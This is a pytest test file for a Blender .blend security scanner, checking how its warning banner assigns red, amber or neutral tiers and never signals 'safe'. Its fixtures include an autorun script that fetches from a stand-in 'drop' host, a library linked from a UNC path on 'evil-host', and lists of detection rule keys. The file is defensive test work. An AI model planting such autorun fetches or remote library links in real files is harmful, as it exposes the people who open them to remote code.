# SPDX-License-Identifier: GPL-3.0-or-later
"""The at-a-glance banner: which tier fires, and what may never appear in it.

Three groups of properties are under test here.

**Tier logic.** Only rules that reach outside Blender make a banner RED; an
``eval()`` is AMBER; nothing found is NEUTRAL. A byte-identical match to a
published release suppresses AMBER and never RED -- the asymmetry documented
in :func:`blend_xray.banner._text_reasons`.

**The no-green rule.** No tier maps to a green colour role, no marker is a
tick or an "OK" symbol in either charset, and no banner string says "safe" or
"clean" in any language. A green tick on a file that later turns out to be
malicious is the screenshot that would end this project's credibility, so the
rule is machine-checked rather than left to review.

**Encoding.** A stock ``cmd.exe`` runs in cp1252 and cannot encode box drawing
or U+2716. Both charsets are exercised, and the ASCII fallback is asserted to
survive an actual cp1252 encode rather than merely to look different.
"""

from __future__ import annotations

import io
import json
import re
from pathlib import Path

import pytest

from blend_xray import banner, cli, explain, identity, report, strings
from blend_xray import scanner as scanner_mod
from blend_xray.banner import Tier
from blend_xray.gui import render, theme

from .blend_builder import BlendBuilder, minimal_blend
from .conftest import BANNED_WORDS_BY_LANG

NETWORK_SCRIPT = """
import urllib.request
urllib.request.urlopen("http://drop.example-host.top/p").read()
"""

EVAL_SCRIPT = """
import bpy
class RIG_PT_panel(bpy.types.Panel):
    bl_label = "Rig"
    def draw(self, context):
        self.layout.operator(eval(context.object.data["op_info"])["bl_idname"])
"""

ORDINARY_SCRIPT = """
import bpy
bpy.context.scene.frame_start = 1
"""

#: Rule keys the banner deliberately ignores: they describe code that stays
#: inside Blender and does the ordinary thing an add-on does.
BENIGN_RULE_KEYS = frozenset(
    {"x_import_geometry", "x_ui_panel", "x_register", "x_driver_namespace"}
)


def _blend(tmp_path: Path, name: str, **kwargs: object) -> Path:
    builder = BlendBuilder()
    for text_name, (body, flags) in kwargs.pop("texts", {}).items():  # type: ignore[union-attr]
        builder.add_text(text_name, body, flags=flags)
    for lib in kwargs.pop("libraries", ()):  # type: ignore[union-attr]
        builder.add_library(lib)
    path = tmp_path / name
    path.write_bytes(builder.to_bytes())
    return path


def _banner_for(path: Path) -> banner.Banner:
    return banner.for_result(scanner_mod.scan_file(path))


@pytest.fixture
def empty_blend(tmp_path: Path) -> Path:
    path = tmp_path / "empty.blend"
    path.write_bytes(minimal_blend())
    return path


@pytest.fixture
def network_blend(tmp_path: Path) -> Path:
    return _blend(tmp_path, "net.blend", texts={"autorun.py": (NETWORK_SCRIPT, 1 | 4 | 16)})


@pytest.fixture
def eval_blend(tmp_path: Path) -> Path:
    return _blend(tmp_path, "eval.blend", texts={"rig.py": (EVAL_SCRIPT, 4)})


def _database(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, *bodies: str) -> None:
    """Register ``bodies`` as byte-identical published releases.

    The body is hashed exactly as written: extraction preserves blank lines, so
    what goes into the .blend is what comes back out of it.
    """
    entries = []
    for index, body in enumerate(bodies):
        entries.append(
            {
                "sha256": identity.sha256_of(body),
                "script_name": f"published_{index}.py",
                "byte_size": len(body.encode("utf-8")),
                "origin": "Example Rig, Example Studio, release 2.1",
                "source_url": "https://example.invalid/rigs/example-2.1.zip",
                "fetched_on": "2026-08-23",
                "attested_by": "test fixture (single attester)",
                "attested_on": "2026-08-23",
                "notes": "Test fixture.",
                "generated": False,
            }
        )
    path = tmp_path / "known_scripts.json"
    path.write_text(
        json.dumps({"schema": identity.SCHEMA_VERSION, "entries": entries}), encoding="utf-8"
    )
    monkeypatch.setattr(identity, "DATABASE_PATH", path)
    identity.clear_cache()


# -- tier logic ---------------------------------------------------------------
def test_reaching_outside_blender_is_red(network_blend: Path) -> None:
    info = _banner_for(network_blend)
    assert info.tier is Tier.RED
    assert "x_network" in info.reasons


def test_eval_on_its_own_is_amber_not_red(eval_blend: Path) -> None:
    """``eval()`` in a rig UI is a second-reader problem, not a red one."""
    info = _banner_for(eval_blend)
    assert info.tier is Tier.AMBER
    assert info.reasons == ("x_dynamic_code",)


def test_nothing_found_is_neutral(empty_blend: Path) -> None:
    info = _banner_for(empty_blend)
    assert info.tier is Tier.NEUTRAL
    assert info.reasons == ()
    assert info.detail() is None


def test_an_ordinary_script_stays_neutral(tmp_path: Path) -> None:
    """A file that only contains ordinary Blender code must not go amber."""
    path = _blend(tmp_path, "plain.blend", texts={"notes.py": (ORDINARY_SCRIPT, 4)})
    assert _banner_for(path).tier is Tier.NEUTRAL


def test_an_unrecognised_autorun_script_is_amber(tmp_path: Path) -> None:
    path = _blend(tmp_path, "auto.blend", texts={"boot.py": (ORDINARY_SCRIPT, 1 | 4 | 16)})
    info = _banner_for(path)
    assert info.tier is Tier.AMBER
    assert banner.REASON_AUTORUN in info.reasons


def test_a_script_that_could_not_be_parsed_is_amber(tmp_path: Path) -> None:
    path = _blend(tmp_path, "broken.blend", texts={"broken.py": ("def (:\n", 4)})
    info = _banner_for(path)
    assert info.tier is Tier.AMBER
    assert banner.REASON_UNREADABLE in info.reasons


def test_a_unc_linked_library_is_red(tmp_path: Path) -> None:
    path = _blend(tmp_path, "unc.blend", libraries=("\\\\evil-host\\share\\rig.blend",))
    info = _banner_for(path)
    assert info.tier is Tier.RED
    assert banner.REASON_UNC_LIBRARY in info.reasons


def test_a_drive_letter_library_is_amber_not_red(tmp_path: Path) -> None:
    path = _blend(tmp_path, "drive.blend", libraries=("D:\\assets\\rig.blend",))
    info = _banner_for(path)
    assert info.tier is Tier.AMBER
    assert banner.REASON_DRIVE_LIBRARY in info.reasons


def test_an_ordinary_relative_library_stays_neutral(tmp_path: Path) -> None:
    """`//../../lib/x.blend` is the standard production layout, not a signal."""
    path = _blend(tmp_path, "rel.blend", libraries=("//../../lib/props.blend",))
    assert _banner_for(path).tier is Tier.NEUTRAL


# -- the known-good asymmetry -------------------------------------------------
def test_a_byte_match_suppresses_amber(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, eval_blend: Path
) -> None:
    """Thousands of people have read this exact script; do not ask one artist to."""
    _database(tmp_path, monkeypatch, EVAL_SCRIPT)
    assert _banner_for(eval_blend).tier is Tier.NEUTRAL


def test_a_byte_match_does_not_suppress_red(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, network_blend: Path
) -> None:
    """Popularity is not a reason to hide "this file talks to the internet"."""
    _database(tmp_path, monkeypatch, NETWORK_SCRIPT)
    info = _banner_for(network_blend)
    assert info.tier is Tier.RED
    assert "x_network" in info.reasons


def test_a_red_banner_names_the_recognition_beside_it(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, network_blend: Path
) -> None:
    _database(tmp_path, monkeypatch, NETWORK_SCRIPT)
    info = _banner_for(network_blend)
    assert info.recognised, "a recognised release must be named, not silently ignored"
    assert "published_0.py" in info.recognised[0]
    assert any("published_0.py" in note for note in info.notes())


def test_a_neutral_banner_never_names_a_recognition(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, eval_blend: Path
) -> None:
    _database(tmp_path, monkeypatch, EVAL_SCRIPT)
    assert _banner_for(eval_blend).recognised == ()


# -- the no-green rule --------------------------------------------------------
def test_no_tier_maps_to_a_green_colour() -> None:
    """The neutral tier is grey. There is no fourth, green, "all clear" tier."""
    assert set(banner.TIER_SEVERITY) == set(Tier)
    for tier, severity in banner.TIER_SEVERITY.items():
        role, _bold = theme.TAG_STYLES[render._SEVERITY_TAGS[severity]]
        assert not theme.is_green(theme.COLOURS[role]), f"{tier} resolved to a green colour"


@pytest.mark.parametrize("ascii_only", [True, False])
def test_no_marker_is_a_tick_or_an_ok_symbol(ascii_only: bool) -> None:
    forbidden = set("\u2713\u2714\u2705\u2611\u2612\u221a")
    for tier in Tier:
        marker = report.tier_marker(tier, ascii_only)
        assert not forbidden & set(marker), f"{tier} marker {marker!r} reads as a pass"
        assert "ok" not in marker.lower()
    assert len({report.tier_marker(t, ascii_only) for t in Tier}) == len(Tier)


def test_every_banner_string_is_present_and_clean_in_every_language() -> None:
    """The never-say-safe rule, extended to every string this feature adds."""
    keys = {k for k in strings.CATALOGUE["en"] if k.startswith("banner_")}
    assert keys, "the banner catalogue section disappeared"
    for lang, banned_words in BANNED_WORDS_BY_LANG.items():
        missing = sorted(keys - set(strings.CATALOGUE[lang]))
        assert missing == [], f"{lang} is missing banner strings: {missing}"
        for key in keys:
            value = strings.CATALOGUE[lang][key].lower()
            for banned in banned_words:
                assert banned not in value, f"[{lang}] {key} must never say {banned!r}"


@pytest.mark.parametrize("lang", ["en", "fr"])
def test_a_rendered_banner_never_says_safe(
    lang: str, network_blend: Path, eval_blend: Path, empty_blend: Path
) -> None:
    pal = report.make_palette(io.StringIO(), force=False)
    strings.set_language(lang)
    for path in (network_blend, eval_blend, empty_blend):
        text = "\n".join(report.banner_lines(scanner_mod.scan_file(path), pal)).lower()
        for banned in BANNED_WORDS_BY_LANG[lang]:
            assert banned not in text, f"[{lang}] the banner must never say {banned!r}"


# -- every reason the logic can emit has plain language behind it -------------
def test_every_reason_key_has_a_phrase_in_every_language() -> None:
    assert set(banner.REASON_ORDER) >= banner.REACHES_OUTSIDE_KEYS
    for lang in strings.CATALOGUE:
        strings.set_language(lang)
        for reason in banner.REASON_ORDER:
            phrase = strings.t("banner_what_" + reason)
            assert not phrase.startswith("!["), f"[{lang}] {reason} has no plain-language phrase"


def test_a_new_explain_rule_cannot_slip_past_the_banner() -> None:
    """Every rule key in explain.py is classified: benign, or a banner reason.

    Without this, adding a detection rule would silently produce findings the
    banner never mentions, which is exactly the wall-of-text failure the
    banner exists to fix.
    """
    source = Path(explain.__file__).read_text(encoding="utf-8")
    emitted = set(re.findall(r'"(x_[a-z_]+)"', source))
    unclassified = emitted - BENIGN_RULE_KEYS - set(banner.REASON_ORDER)
    assert unclassified == set(), f"rule keys with no banner treatment: {sorted(unclassified)}"


# -- encoding -----------------------------------------------------------------
class _BrokenEncoding:
    """A stream that names an encoding Python does not have."""

    encoding = "definitely-not-a-codec"

    def isatty(self) -> bool:
        return False


@pytest.mark.parametrize(
    ("stream", "expected_ascii"),
    [
        (io.TextIOWrapper(io.BytesIO(), encoding="cp1252"), True),
        (io.TextIOWrapper(io.BytesIO(), encoding="utf-8"), False),
        (io.StringIO(), False),
        (_BrokenEncoding(), True),
    ],
)
def test_charset_is_chosen_from_what_the_stream_can_encode(
    stream: object, expected_ascii: bool
) -> None:
    assert report.make_palette(stream, force=False).ascii_only is expected_ascii  # type: ignore[arg-type]


def test_the_ascii_banner_really_survives_cp1252(network_blend: Path) -> None:
    """The point of the fallback is that this encode does not raise."""
    pal = report.make_palette(io.StringIO(), force=False, ascii_only=True)
    text = report.format_text_report(scanner_mod.scan_file(network_blend), pal)
    text.encode("cp1252")  # would raise UnicodeEncodeError on the unicode path
    assert "+---" in text
    assert "[X]" in text


def test_the_unicode_banner_is_used_when_the_stream_can_take_it(network_blend: Path) -> None:
    pal = report.make_palette(io.StringIO(), force=False, ascii_only=False)
    lines = report.banner_lines(scanner_mod.scan_file(network_blend), pal)
    assert lines[0].startswith("\u250c")
    with pytest.raises(UnicodeEncodeError):
        "\n".join(lines).encode("cp1252")


def test_both_charsets_draw_a_box_of_the_same_width(network_blend: Path) -> None:
    result = scanner_mod.scan_file(network_blend)
    for ascii_only in (True, False):
        pal = report.make_palette(io.StringIO(), force=False, ascii_only=ascii_only)
        widths = {len(line) for line in report.banner_lines(result, pal)}
        assert widths == {report.BANNER_WIDTH}


# -- where it renders ---------------------------------------------------------
def test_the_banner_opens_the_text_report(network_blend: Path) -> None:
    pal = report.make_palette(io.StringIO(), force=False, ascii_only=True)
    lines = report.format_text_report(scanner_mod.scan_file(network_blend), pal).splitlines()
    assert lines[0].startswith("+--")
    assert "[X]" in lines[1]
    # ... and it arrives before the file meta line, not after it.
    meta = next(i for i, line in enumerate(lines) if "Blender file version" in line)
    assert meta > 1


def test_quiet_keeps_the_banner_and_names_the_file(network_blend: Path) -> None:
    """--quiet drops every context section; the banner is what it keeps."""
    pal = report.make_palette(io.StringIO(), force=False, ascii_only=True)
    text = report.format_text_report(scanner_mod.scan_file(network_blend), pal, quiet=True)
    assert text.splitlines()[0].startswith("+--")
    assert "[X]" in text
    assert str(network_blend) in text
    assert strings.t("categories_checked_header", count=5) not in text


def test_the_window_draws_the_banner_before_anything_else(network_blend: Path) -> None:
    elements = render.render_result(scanner_mod.scan_file(network_blend))
    first = elements[0]
    assert isinstance(first, render.Line)
    assert strings.t("banner_red_headline") in first.text
    assert first.tag == theme.TAG_ALARM


def test_the_window_draws_a_neutral_banner_dim(empty_blend: Path) -> None:
    first = render.render_result(scanner_mod.scan_file(empty_blend))[0]
    assert isinstance(first, render.Line)
    assert first.tag == theme.TAG_DIM


def test_a_neutral_banner_says_what_was_looked_at_and_is_not_a_clearance(
    empty_blend: Path,
) -> None:
    info = _banner_for(empty_blend)
    notes = " ".join(info.notes())
    assert strings.t("banner_neutral_not_clearance") in notes
    assert strings.t("cat_driver") in notes
    assert strings.t("cat_library") in notes
    assert "5" in info.headline()


def test_a_neutral_banner_does_not_claim_nothing_was_found_when_code_is_present(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, eval_blend: Path
) -> None:
    """A byte-matched rig script is still code. The headline must not deny it."""
    _database(tmp_path, monkeypatch, EVAL_SCRIPT)
    info = _banner_for(eval_blend)
    assert info.tier is Tier.NEUTRAL
    assert info.headline() == strings.t("banner_neutral_headline_accounted", count=5)
    assert info.headline() != strings.t("banner_neutral_headline", count=5)


# -- machine-readable output --------------------------------------------------
@pytest.mark.parametrize("lang", ["en", "fr"])
def test_json_carries_a_language_independent_tier(
    lang: str, network_blend: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    assert cli.run(["--lang", lang, "scan", str(network_blend), "--json"]) == cli.EXIT_FINDINGS
    payload = json.loads(capsys.readouterr().out)
    assert payload["lang"] == lang
    entry = payload["files"][0]["banner"]
    assert entry["tier"] == "red"
    assert "x_network" in entry["reasons"]
    assert entry["recognised"] == []


def test_json_tier_is_neutral_for_a_file_with_nothing_found(
    empty_blend: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    assert cli.run(["scan", str(empty_blend), "--json"]) == cli.EXIT_OK
    payload = json.loads(capsys.readouterr().out)
    assert payload["files"][0]["banner"] == {
        "tier": "neutral",
        "reasons": [],
        "recognised": [],
        "timed_out": False,
    }


def test_the_banner_adds_nothing_to_the_inventory(network_blend: Path) -> None:
    """The banner is a header. It must not appear inside the findings payload."""
    result = scanner_mod.scan_file(network_blend)
    assert "banner" not in result.to_dict()


# -- what RED is allowed to mean ----------------------------------------------
# The headline is "This file contains code that reaches outside Blender." Every
# member of REACHES_OUTSIDE_KEYS is a promise that its own sentence supports
# that headline, so the membership itself is tested rather than left to review.
def test_an_encoded_blob_alone_does_not_reach_outside_blender() -> None:
    """"Carries a block of encoded text" is data sitting in the file.

    It opens no socket, starts no process, touches nothing in the operating
    system, and is not necessarily code -- an embedded icon looks the same.
    It keeps its ALARMING severity and still spends an AMBER; it just no
    longer claims the RED headline's sentence.
    """
    assert "x_opaque_blob" not in banner.REACHES_OUTSIDE_KEYS
    assert "x_opaque_blob" in banner.REASON_ORDER


@pytest.mark.parametrize(
    "key",
    [
        "x_network_listen",
        "x_builtins_indirection",
        "x_indirect_call",
        "x_assembled_name",
        "x_obfuscation",
        "x_network",
        "x_subprocess",
    ],
)
def test_keys_that_do_reach_outside_blender(key: str) -> None:
    assert key in banner.REACHES_OUTSIDE_KEYS


@pytest.mark.parametrize(
    "key",
    [
        "x_compile_code",
        "x_deserialise",
        "x_runtime_import",
        "x_decodes_data",
        "x_opens_browser",
        "x_split_literal",
        "x_handler_register",
        "x_handler_persist",
        "x_dynamic_code",
    ],
)
def test_keys_that_ask_for_a_second_reader_but_do_not_escalate(key: str) -> None:
    """These describe code that stays inside Blender, or whose reach depends
    on something this tool cannot see. AMBER, never RED."""
    assert key not in banner.REACHES_OUTSIDE_KEYS
    assert key in banner.REASON_ORDER


def test_a_blob_alone_still_produces_a_banner(tmp_path: Path) -> None:
    """Demoting it out of RED must not demote it out of the banner entirely."""
    blob = "QUJDRA" * 40
    path = _blend(
        tmp_path,
        "blob.blend",
        texts={"data.py": (f'PAYLOAD = "{blob}"\n', 4)},
    )
    info = _banner_for(path)
    assert info.tier is Tier.AMBER
    assert "x_opaque_blob" in info.reasons
